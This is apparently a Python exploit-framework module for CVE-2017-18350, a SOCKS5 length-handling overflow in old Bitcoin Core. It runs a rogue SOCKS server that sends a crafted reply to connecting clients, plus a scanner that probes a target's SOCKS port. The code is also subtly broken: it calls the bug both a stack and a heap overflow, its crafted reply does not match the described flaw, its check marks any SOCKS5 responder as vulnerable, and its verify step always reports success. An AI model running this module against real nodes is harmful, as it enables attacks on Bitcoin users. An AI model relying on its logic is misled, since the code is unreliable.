"""CVE-2017-18350: Bitcoin Core SOCKS Proxy Buffer Overflow

This vulnerability is a signed/unsigned conversion bug in Bitcoin Core's
SOCKS5 proxy handling. An attacker controlling the SOCKS proxy can trigger
a stack buffer overflow by sending a domain name length with the high bit set.

Reference: https://bitcoincore.org/en/2019/11/08/CVE-2017-18350/
Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-18350

Affected: Bitcoin Core 0.7.0 - 0.15.0
Fixed In: Bitcoin Core 0.15.1
Severity: HIGH (7.5 CVSS)
"""

import asyncio
import struct

from minesploit.framework import Exploit, ExploitMeta, ExploitResult


class CVE_2017_18350_SOCKS_OVERFLOW(Exploit):
    meta = ExploitMeta(
        name="CVE-2017-18350: Bitcoin Core SOCKS Proxy Buffer Overflow",
        cve="CVE-2017-18350",
        cvss_score=7.5,
        severity="HIGH",
        affected_versions="Bitcoin Core 0.7.0 - 0.15.0",
        discovered_by="practicalswift",
        disclosure_date="2019-11-08",
        description=(
            "Bitcoin Core before 0.15.1 has a signed/unsigned conversion bug in "
            "SOCKS5 proxy handling. When a malicious SOCKS5 server sends a domain "
            "name length with the high bit set (128-255), it is interpreted as "
            "negative on systems with signed char, causing a heap buffer overflow "
            "when passed to recv() as size_t"
        ),
        references=[
            "https://bitcoincore.org/en/2019/11/08/CVE-2017-18350/",
            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-18350",
        ],
    )

    def __init__(self):
        super().__init__()
        self.socks_port = 9050

    async def check(self, target: str, **kwargs) -> ExploitResult:
        socks_port = kwargs.get("socks_port", self.socks_port)
        version = kwargs.get("version", None)

        if version:
            try:
                major, minor, patch = map(int, version.split("."))
                if major == 0 and minor < 15:
                    return ExploitResult(
                        True,
                        f"Target version {version} is vulnerable",
                        {"vulnerable": True, "version": version},
                    )
                elif major >= 1 or (major == 0 and minor >= 15):
                    return ExploitResult(
                        False,
                        f"Target version {version} is not vulnerable (fixed in 0.15.1)",
                        {"vulnerable": False, "version": version},
                    )
            except (ValueError, AttributeError):
                pass

        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(target, socks_port),
                timeout=5.0,
            )

            writer.write(b"\x05\x01\x00")
            await writer.drain()

            response = await asyncio.wait_for(reader.read(2), timeout=5.0)
            writer.close()
            await writer.wait_closed()

            if response and response[0:1] == b"\x05":
                return ExploitResult(
                    True,
                    f"SOCKS5 proxy detected on {target}:{socks_port}",
                    {"vulnerable": True, "socks_detected": True},
                )

            return ExploitResult(
                False,
                f"No SOCKS5 proxy detected on {target}:{socks_port}",
                {"vulnerable": False},
            )

        except asyncio.TimeoutError:
            return ExploitResult(
                False,
                "Connection to SOCKS proxy timed out",
                {"vulnerable": False},
            )
        except ConnectionRefusedError:
            return ExploitResult(
                False,
                "SOCKS proxy connection refused",
                {"vulnerable": False},
            )
        except Exception as e:
            return ExploitResult(
                False,
                f"Error checking SOCKS proxy: {str(e)}",
            )

    async def exploit(
        self,
        target: str,
        socks_port: int = 9050,
        **kwargs,
    ) -> ExploitResult:
        exploit_server = MaliciousSocksServer(
            listen_port=kwargs.get("listen_port", 1080),
            target_socks=f"{target}:{socks_port}",
        )
        try:
            await exploit_server.start()
            return ExploitResult(
                True,
                f"Malicious SOCKS server started on :{exploit_server.listen_port}",
                {
                    "started": True,
                    "listen_port": exploit_server.listen_port,
                    "target": target,
                },
            )
        except Exception as e:
            return ExploitResult(
                False,
                f"Failed to start malicious SOCKS server: {str(e)}",
            )

    async def verify(self, target: str, **kwargs) -> ExploitResult:
        return ExploitResult(
            True,
            "Verify by checking target for crashes or abnormal behavior",
        )


class MaliciousSocksServer:
    def __init__(self, listen_port: int, target_socks: str):
        self.listen_port = listen_port
        self.target_socks = target_socks
        self.server: asyncio.Server | None = None

    async def start(self):
        self.server = await asyncio.start_server(
            self.handle_client,
            "0.0.0.0",
            self.listen_port,
        )

    async def stop(self):
        if self.server:
            self.server.close()
            await self.server.wait_closed()

    async def handle_client(
        self,
        reader: asyncio.StreamReader,
        writer: asyncio.StreamWriter,
    ):
        try:
            greeting = await asyncio.wait_for(reader.read(2), timeout=10.0)
            if greeting != b"\x05\x01":
                writer.close()
                await writer.wait_closed()
                return

            writer.write(b"\x05\x00")
            await writer.drain()

            request = await asyncio.wait_for(reader.read(10), timeout=10.0)
            if len(request) < 5:
                writer.close()
                await writer.wait_closed()
                return

            if request[1] == 0x01:
                malicious_domain = b"\xff.example.com"
                response = b"\x05\x00\x01" + b"\x00\x00\x00\x00" + struct.pack("!H", 443)
                response += malicious_domain

                writer.write(response)
                await writer.drain()

            writer.close()
            await writer.wait_closed()

        except Exception:
            try:
                writer.close()
                await writer.wait_closed()
            except Exception:
                pass
